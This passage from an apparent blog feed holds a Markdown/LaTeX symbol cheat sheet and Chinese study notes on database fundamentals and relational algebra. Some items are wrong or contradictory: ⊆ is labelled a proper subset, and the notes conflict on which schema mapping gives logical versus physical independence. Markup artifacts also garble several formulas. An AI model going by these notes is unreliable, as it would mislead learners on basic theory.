        <content type="html"><![CDATA[<p>发现自己 MarkDown 的好多语法还要上网上搜索，那干脆自己记录一下吧。</p><table><thead><tr><th>符号</th><th>Markdown</th><th>名称</th></tr></thead><tbody><tr><td>∅</td><td><code>\emptyset</code></td><td>空集</td></tr><tr><td>∈</td><td><code>\in</code></td><td>属于</td></tr><tr><td>∋</td><td><code>\ni</code></td><td></td></tr><tr><td>∉</td><td><code>\notin</code></td><td>不属于</td></tr><tr><td>⊂</td><td><code>\subset</code></td><td>子集</td></tr><tr><td>⊃</td><td><code>\supset</code></td><td></td></tr><tr><td>⊄</td><td><code>\not\subset</code></td><td>非子集</td></tr><tr><td>⊆</td><td><code>\subseteq</code></td><td>真子集</td></tr><tr><td>⊇</td><td><code>\supseteq</code></td><td></td></tr><tr><td>∪</td><td><code>\cup</code></td><td>并集</td></tr><tr><td>⋃</td><td><code>\bigcup</code></td><td>并集</td></tr><tr><td>∩</td><td><code>\cap</code></td><td>交集</td></tr><tr><td>⋂</td><td><code>\bigcap</code></td><td>交集</td></tr><tr><td>∨</td><td><code>\vee</code></td><td>或者</td></tr><tr><td>∧</td><td><code>\wedge</code></td><td>并且</td></tr><tr><td>∖</td><td><code>\setminus</code></td><td>集合的减法</td></tr><tr><td n="">\prod_{i=1}^</td><td>$\prod_<ruby>i=1}<rp>【</rp><rt>{n</rt><rp>】</rp></ruby>$</td><td>连乘</td></tr></tbody></table><table><thead><tr><th>字母</th><th>实现</th><th>字母</th><th>实现</th><th>字母</th><th>实现</th></tr></thead><tbody><tr><td>A</td><td><code>A</code></td><td>α</td><td><code>\alpha</code></td><td>Θ</td><td><code>\Theta</code></td></tr><tr><td>B</td><td><code>B</code></td><td>β</td><td><code>\beta</code></td><td>ι</td><td><code>\iota</code></td></tr><tr><td>Γ</td><td><code>\Gamma</code></td><td>γ</td><td><code>\gamma</code></td><td>K</td><td><code>K</code></td></tr><tr><td>Δ</td><td><code>\Delta</code></td><td>δ</td><td><code>\delta</code></td><td>κ</td><td><code>\kappa</code></td></tr><tr><td>E</td><td><code>E</code></td><td>ϵ</td><td><code>\epsilon</code></td><td>Λ</td><td><code>\Lambda</code></td></tr><tr><td>Z</td><td><code>Z</code></td><td>ζ</td><td><code>\zeta</code></td><td>λ</td><td><code>\lambda</code></td></tr><tr><td>H</td><td><code>H</code></td><td>η</td><td><code>\eta</code></td><td>M</td><td><code>M</code></td></tr><tr><td>Θ</td><td><code>\Theta</code></td><td>θ</td><td><code>\theta</code></td><td>μ</td><td><code>\mu</code></td></tr><tr><td>I</td><td><code>I</code></td><td>ι</td><td><code>\iota</code></td><td>N</td><td><code>N</code></td></tr><tr><td>Ξ</td><td><code>\Xi</code></td><td>ξ</td><td><code>\xi</code></td><td>ν</td><td><code>\nu</code></td></tr><tr><td>O</td><td><code>O</code></td><td>ο</td><td><code>\omicron</code></td><td>Π</td><td><code>\Pi</code></td></tr><tr><td>P</td><td><code>P</code></td><td>ρ</td><td><code>\rho</code></td><td>Σ</td><td><code>\Sigma</code></td></tr><tr><td>T</td><td><code>T</code></td><td>σ</td><td><code>\sigma</code></td><td>Υ</td><td><code>\Upsilon</code></td></tr><tr><td>Φ</td><td><code>\Phi</code></td><td>ϕ</td><td><code>\phi</code></td><td>X</td><td><code>X</code></td></tr><tr><td>χ</td><td><code>\chi</code></td><td>Ψ</td><td><code>\Psi</code></td><td>ψ</td><td><code>\psi</code></td></tr><tr><td>Ω</td><td><code>\Omega</code></td><td>ω</td><td><code>\omega</code></td><td>ε</td><td><code>\varepsilon</code></td></tr><tr><td>ϑ</td><td><code>\vartheta</code></td><td>ϖ</td><td><code>\varpi</code></td><td>ϱ</td><td><code>\varrho</code></td></tr><tr><td>ς</td><td><code>\varsigma</code></td><td>φ</td><td colspan="2"><code>\varphi</code></td><td>`</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库</title>
      <link href="/2023/11/17/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0/"/>
      <url>/2023/11/17/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这里主要是复习的时候听着网课重新做一遍笔记。</p></blockquote><h1 id="一绪论"><a class="markdownIt-Anchor" href="#一绪论">#</a> 一，绪论</h1><h2 id="介绍"><a class="markdownIt-Anchor" href="#介绍">#</a> 介绍</h2><h3 id="数据库系统概述"><a class="markdownIt-Anchor" href="#数据库系统概述">#</a> 数据库系统概述</h3><h4 id="数据"><a class="markdownIt-Anchor" href="#数据">#</a> 数据</h4><p>数据是数据库中存储的基本对象。<br><strong>[定义]</strong> 计算机用来描述事物的符号记录（文字．图形．图像．声音）</p><ul><li>数据的形式本身并不能完全表达其内容，需要经过语义解释。<strong>特点：数据与其语义是不可分的</strong></li></ul><h4 id="数据库-db"><a class="markdownIt-Anchor" href="#数据库-db">#</a> 数据库 DB</h4><ul><li>数据库是长期存储在计算机内有结构的大量的共享的数据集合。（<strong>有组织，可共享</strong>）</li></ul><h4 id="数据库管理系统-dbms"><a class="markdownIt-Anchor" href="#数据库管理系统-dbms">#</a> 数据库管理系统 DBMS</h4><p><strong>[定义]</strong> 数据库管理系统是位于用户与操作系统之间的一层数据管理软件。<br><strong>主要功能：</strong></p><ul><li>数据定义功能</li><li>数据组织，存储和管理功能</li><li>数据操纵功能（插入，查询，删除，修改等）</li><li>数据库的事务管理和运行管理（安全性，完整性，多用户并发处理）</li><li>数据库的建立和维护功能</li></ul><h4 id="数据库系统-dbs"><a class="markdownIt-Anchor" href="#数据库系统-dbs">#</a> 数据库系统 DBS</h4><p><strong>[定义]</strong> 数据库系统由数据库（DB），数据库管理系统（DBMS），应用系统，数据库管理员（DBA）构成。<br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/%E7%BB%AA%E8%AE%BA1.png?raw=true" alt="绪论1"></p><h3 id="数据管理技术的发展"><a class="markdownIt-Anchor" href="#数据管理技术的发展">#</a> 数据管理技术的发展</h3><p><strong>一，人工管理阶段</strong></p><ul><li>数据不保存</li><li>数据不共享</li><li>应用程序管理数据</li><li>数据不独立<br><strong>二，文件系统阶段</strong></li><li>数据保存</li><li>文件系统管理数据</li><li>数据共享差，冗余大</li><li>数据独立性差<br><strong>三，数据库系统阶段</strong></li><li>数据结构化</li><li>数据共享性高，冗余度低，易扩充</li><li>数据独立性高</li><li>数据由 DBMS 同一管理和控制：安全，完整，并发，恢复</li></ul><h2 id="数据模型"><a class="markdownIt-Anchor" href="#数据模型">#</a> 数据模型</h2><p><strong>[定义]</strong> 一组概念的集合，对现实世界数据特征进行抽象。</p><ul><li><strong>概念模型</strong> ： 按照用户观点建模，用于数据库设计</li><li><strong>逻辑和物理模型</strong></li></ul><blockquote><p><strong>逻辑模型</strong>：按计算机系统观点对数据建模， 用于 DBMS 的实现。主要包括：层次模型，网状模型，关系模型（二维表的数据库），面向对象模型和对象关系模型。<br><strong>物理模型</strong>：系统内部或磁盘上表示方式、存取方法，面向计算机系统。其是对数据最底层的抽象</p></blockquote><h4 id="数据模型的组成元素"><a class="markdownIt-Anchor" href="#数据模型的组成元素">#</a> 数据模型的组成元素</h4><p><strong>一，数据结构</strong><br>描述数据库的组成对象，以及对象之间的联系。数据结构是所描述的对象类型的集合，是对系统静态特性的描述。<br><strong>二，数据操作</strong><br>数据库主要有查询和更新（包括插入，删除，修改等），两大类操作。是对系统动态特性的描述。<br><strong>三，数据的完整性约束条件</strong><br>数据的完整性约束条件是一组完整性规则。<br>【例】 关系模型中，任何的关系必须满足实体完整性和参照完整性。</p><h4 id="概念模型"><a class="markdownIt-Anchor" href="#概念模型">#</a> 概念模型</h4><p><strong>定义：</strong></p><ul><li>概念模型用于信息世界的建模</li><li>现实世界到信息世界的第一层抽象</li><li>数据库设计人员进行数据库设计的有力工具</li><li>数据库设计人员和用户之间进行交流的语言<br><strong>概念模型要求：</strong></li><li>具有较强的语义表达能力</li><li>能够方便，直接的表达应用中的各种语义知识</li><li>简单，清晰，易于用户理解<br><strong>一，信息世界中的基本概念</strong><br><strong> 1，实体 Entity</strong><br> 客观存在并且可以相互去别的事务即实体。可以是人，事，物，也可以是抽象的概念或者联系。<br>【例】 一个职工，学生，部门，课等都是实体<br><strong> 2，属性</strong><br>实体所具有的某一特性称为属性。一个实体可以由若干个属性来刻画。<br>【例】学生的 学号，姓名 等<br><strong> 3，码 key</strong><br> 唯一标识实体的属性集称为码。<br><strong>4，域</strong><br>具有相同数据类型的值的集合。即属性的取值范围。<br><strong>5，实体型</strong><br>具有相同属性的实体必然具有共同的特征和性质。<br><strong>6，实体集</strong><br>同一类型实体的集合称为实体集。<br><strong>7，联系</strong><br>现实世界中，事务内部以及事物之间是有联系的。实体内部各个属性的联系或者不同实体集之间的联系。<br><strong>二，两个实体型之间的联系</strong><br><strong> 1，一对一</strong><br>对于 A 中的每一个实体，B 中至多有一个（可以没有）实体与之联系，反之亦然。<br>【例】一个班级只有一个班长<br><strong> 2，一对多</strong><br> A 中的一个实体，B 中有 n 歌实体与之联系，但是 B 中每一个实体在 A 中最多只有一个实体联系。<br>【例】一个班级有若干名学生，学生之恶能在一个班级学习。<br><strong>3，多对多</strong><br> A 中的每一个实体，B 中有多个，反之也是一样。<br><strong>三，概念模型得表示方法：实体 - 联系方法</strong><br>实体联系方法用 E-R 图来描述现实世界得概念模型，所刻画的某些也称为 E-R 模型。</li></ul><h4 id="数据模型得组成要素"><a class="markdownIt-Anchor" href="#数据模型得组成要素">#</a> 数据模型得组成要素</h4><ul><li>数据结构：数据结构是所研究得对象类型得集合</li><li>数据操作：对数据库得对象（型）的实例（值）进行操作（查询，更新）</li><li>数据的完整性约束条件：实体完整性，参照完整性。满足条件来保证数据的正确性，有效性和相容性</li></ul><h3 id="数据库系统结构"><a class="markdownIt-Anchor" href="#数据库系统结构">#</a> 数据库系统结构</h3><h4 id="数据库系统模式概念"><a class="markdownIt-Anchor" href="#数据库系统模式概念">#</a> 数据库系统模式概念</h4><p><strong>（1）型和值</strong></p><ul><li><strong>型 (type)：对某一类数据的结构和属性的说明</strong></li><li><strong>值 (value)：是型的一个具体赋值</strong><br><strong>（2）模式和实例</strong><br><strong>模式 (schema)：是数据库逻辑结构和特征的描述</strong></li><li>是<strong>型的描述</strong></li><li>反应的是<strong>数据的结构及其联系</strong></li><li>模式<strong>相对稳定</strong><br><strong>实例 (instance)：模式的一个具体值</strong></li><li>反映数据库<strong>某一时刻的状态</strong></li><li>同一个模式<strong>可以有很多实例</strong></li><li>实例随数据中的数据的<strong>更新而变动</strong><br><strong>（3）三级模式</strong></li><li>模式：是数据库中全体数据得逻辑结构和特征得描述，同一个模式可以有多个实例。一个数据库只有一个模式。</li><li>外模式：数据库用户能看见和使用得局部数据得逻辑结构和特征得描述，是数据库用户得数据视图，与某一应用有关的数据的逻辑表示。<strong>外模式通常是模式的一个子集</strong>，所以模式与外模式的关系为<strong>一对多</strong>。</li><li>内模式：也称存储模式，是数据物理结构和存储方式的描述，是数据在数据库内部的组织方式。<br><strong>（4）二级映像</strong><br>模式 / 内模式有映像：保证数据与程序的逻辑独立性。<strong>当数据库的存储结构改变时 (例如选用了另一种存储结构)，由数据库管理员对模式 / 内模式映像作相应改变，可以使模式保持不变。从而应用程序不必改变，保证了数据与程序的物理独立性，简称数据的物理独立性</strong>。</li></ul><p>外模式 / 模式有映像：定义全局逻辑结构和存储结构之间的对应关系，保证数据和程序的物理独立性。<strong>当模式改变时 (例如增加新的关系、新的属性、改变属性的数据类型等)，由数据库管理员对各个外模式 / 模式的映像作相应改变，可以使外模式保持不变。应用程序是依据数据的外模式编写的，从而应用程序不必修改，保证了数据与程序的逻辑独立性，简称数据的逻辑独立性</strong>。</p><h1 id="二关系数据库"><a class="markdownIt-Anchor" href="#二关系数据库">#</a> 二，关系数据库</h1><h3 id="关系"><a class="markdownIt-Anchor" href="#关系">#</a> 关系</h3><p>单一的数据结构 — 关系<br>逻辑结构 — 二维表<br><strong>关系模型是建立在集合代数的基础上的</strong></p><h4 id="概念"><a class="markdownIt-Anchor" href="#概念">#</a> 概念</h4><p><strong>1，域</strong><br>具有相同数据类型的值的集合。即属性的取值范围。<br><strong>2，笛卡尔积</strong><br>给定一组域<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">D_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> , <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">D_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> , <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">D_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>, <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">D_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> , 这些域的笛卡尔积为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">D_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>  × <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">D_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ×…× <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">D_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> =<ruby>($d_1$,$d_2$,…,$d_n$)|$d_i$∈$D_i$,i=1,2,3,…,n} **3, 元组 **笛卡尔积中每一个元素乘坐一个 n 元组。表的每一行叫做一个元组。**4，分量 **元素中每一个值 $d_i$ 称做一个分量。**5，基数 **若 $D_i$ 为有限集，其基数为 $m_i$，则 $D_1$ × $D_2$ … $D_n$ 的基数为 M = $\prod_{i=1}<rp>【</rp><rt>{n</rt><rp>】</rp></ruby>$$m_i$</p><h4 id="码"><a class="markdownIt-Anchor" href="#码">#</a> 码</h4><ul><li>候选码：若关系中的某一属性组能唯一标识一个元组，而其子集不能，则称该属性组为候选码。</li><li>全码（ALL-key）：最极端的情况，关系模式的所有属性共同构成这个关系模式的候选码，称为全码。</li><li>主码：若一个关系有多个候选码，则选定一个作为主码（Primary key）。能够唯一标识一条记录的<strong>最小属性集</strong>。</li><li>主属性：候选码的诸个属性称为主属性</li><li>非主属性：不包含在任何候选码中的属性 （或者说非码属性）。</li></ul><h4 id="三类关系"><a class="markdownIt-Anchor" href="#三类关系">#</a> 三类关系</h4><ul><li>基本关系 (基本表)：实际存在的表，是实际存储数据的逻辑表示</li><li>查询表：查询结果对应的表</li><li>视图表：有基本表或者其他视图表导出的表，<strong>是虚表</strong>，不对应实际存储的数据。</li></ul><h4 id="关系模式"><a class="markdownIt-Anchor" href="#关系模式">#</a> 关系模式</h4><p>【定义】 是对关系的描述。关系模式是型，关系是值。 关系模式是静态的。<br>关系的形式化表示：R (U, D, dom, F)<br> R：关系名  U：组成该关系的属性集合  DOM：属性项域的映像集合 F：属性间的数据依赖关系集合</p><h4 id="关系数据库"><a class="markdownIt-Anchor" href="#关系数据库">#</a> 关系数据库</h4><p>一个给定的应用领域中，所有关系的集合构成一个关系数据库。</p><h3 id="关系的完整性"><a class="markdownIt-Anchor" href="#关系的完整性">#</a> 关系的完整性</h3><p>【定义】: <strong>关系模型中有三类完整性约束：实体完整性，参照完整性，用户定义的完整性。</strong></p><h4 id="实体完整性"><a class="markdownIt-Anchor" href="#实体完整性">#</a> 实体完整性</h4><p>是指若属性 A 是基本关系 R 的主属性，则 A 不能取空值。<br><strong>实体完整性规则的说明:</strong><br>（1）主码不能为空值。（所有的主属性都不能取空值）<br>（2）两个元素的主码不能相同。</p><h4 id="参照完整性"><a class="markdownIt-Anchor" href="#参照完整性">#</a> 参照完整性</h4><p>这里介绍一下<strong>外码 / 外键</strong>。<br>定义：设 F 是基本关系 R 的一个或一组属性，但不是关系 R 的码。如果 F 与基本关系 S 的主码<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mi>s</mi></msub></mrow><annotation encoding="application/x-tex">K_s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 相对应，则称 F 是基本关系 S 的外码。 基本关系 R 为参照关系，基本关系 S 为被参照关系。<br><strong>参照完整性规则：</strong><br>对于 R 上每个元组在 F 上的取值：要么取空值，要么等于 S 中某个元组的主码值。<br>例如有如下两个关系：</p><ul><li>部门 (<u>部门号</u>，部门名，电话)</li><li>雇员 (<u>雇员号</u>，雇员名，职称，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi><munder><mo><mtext>部门号</mtext></mo><mo lspace="0em" rspace="0em">∼</mo></munder></mi></mrow><annotation encoding="application/x-tex">\underset{\sim}{部门号}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.38333em;vertical-align:-0.7em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.68333em;"><span style="top:-2.4em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mrel mtight">∼</span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mord cjk_fallback">部门号</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.7em;"><span></span></span></span></span></span></span></span></span></span>)<br> 这里得部门号即外码，可以取部门中部门号得取值或者空值。<br>值得注意的是，外键可能来自同一关系，也就是被参照关系就是参照关系。<br>Students(<u>sid</u>, name, login, age, gpa, <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi><munder><mo><mi>p</mi><mi>a</mi><mi>r</mi><mi>t</mi><mi>n</mi><mi>e</mi><mi>r</mi></mo><mo lspace="0em" rspace="0em">∼</mo></munder></mi></mrow><annotation encoding="application/x-tex">\underset{\sim}{partner}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.50952em;vertical-align:-0.89444em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.61508em;"><span style="top:-2.20556em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mrel mtight">∼</span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">t</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.02778em;">er</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.89444em;"><span></span></span></span></span></span></span></span></span></span>), partner 是 对 sid 的一个外键约束，一个学生可能没有同伴，故其可以取空，相应的，对于课程，当一门课程没有前期课程时，preq 可以为空，空值并不违反外键约束</li></ul><h4 id="用户定义的完整性"><a class="markdownIt-Anchor" href="#用户定义的完整性">#</a> 用户定义的完整性</h4><p>这里就是自己对数据加上域，即添加约束。用户自定义完整性 1 针对某一具体关系数据库的约束条件，反映<strong>某一具体应用所涉及的数据必须满足的语义要求</strong>，例如某个属性必须取唯一值，某个非主属性不能取空值等等.</p><h3 id="关系代数"><a class="markdownIt-Anchor" href="#关系代数">#</a> 关系代数</h3><h4 id="传统的集合运算"><a class="markdownIt-Anchor" href="#传统的集合运算">#</a> 传统的集合运算</h4><p>注意这里默认 R 和 S 都有相同的目 n（都具有 n 个属性）<br><strong>1，并 (union)</strong><br> R 并 S，即在 R 也在 S 的元素集合<br><strong> 2，差 (expect)</strong><br> R 差 S，在 R 中而不在 S 中的元素的集合<br><strong> 3，交 (intersection)</strong><br> R 交 S，既属于 R 又属于 S 的元组组成。<br><strong>4，笛卡尔积</strong><br> R：n 目，k 个元组   S：m 目，t 个元组<br> R X S ：结果 行: k × t 个元组 列: (n+m) 个列</p><h4 id="专门的关系运算"><a class="markdownIt-Anchor" href="#专门的关系运算">#</a> 专门的关系运算</h4><p><strong>1，选择</strong><br>通过条件筛选来查询相应数据。例如<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>σ</mi><mrow><mi>s</mi><mi>a</mi><mi>g</mi><mi>e</mi><mo>&lt;</mo><mn>20</mn></mrow></msub></mrow><annotation encoding="application/x-tex">σ_{sage&lt;20}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span><span class="mord mathnormal mtight">e</span><span class="mrel mtight">&lt;</span><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>(student) 表示查询年龄小于 20 的学生。<br><strong>2，投影运算</strong><br>只从关系 R 中选取若干属性组成新的关系。例如<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>π</mi><mrow><mi>s</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo separator="true">,</mo><mi>s</mi><mi>d</mi><mi>e</mi><mi>p</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\pi_{sname,sdept}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight">n</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight">e</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight">d</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>，是只查询学生的姓名和所在系。<br><strong>3，连接运算</strong><br> R 和 S 进行连接运算的结果：从 R 和 S 的广义笛卡尔积 R × S 中选取 (R 关系) 在 A 属性组上的值与（S 关系）在 B 属性组上值满足关系 θ 的元组。</p><ul><li>等值连接：从关系 R 和 S 的广义笛卡尔积中找到 A 和 B 属性相等的那些元组。（A 和 B 可以不是同一个属性）。<strong>这里没有去掉重复列。</strong></li><li>自然连接：是一种特殊的等值连接，R 和 S 中具有相同属性组 B，<strong>在结果结果中把重复的属性列去掉</strong>。</li><li>外连接：悬浮元组的概念：R 和 S 在做自然连接时，R 中某些元组有可能在 S 中不存在公共属性上值相等的元组，就会造成 R 中这些元组在操作时被舍弃（反过来 S 也是这样）。<br><strong>4，除运算</strong><br>这里先给出<strong>象集</strong>的定义：当在 R 关系中属性 A 取 x 值时，其他属性例如 B 可以取什么值，这个取得值得集合称为 1 象集。<br>R÷S={tr [X]| tr∈R 并且<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>π</mi><mi>y</mi></msub></mrow><annotation 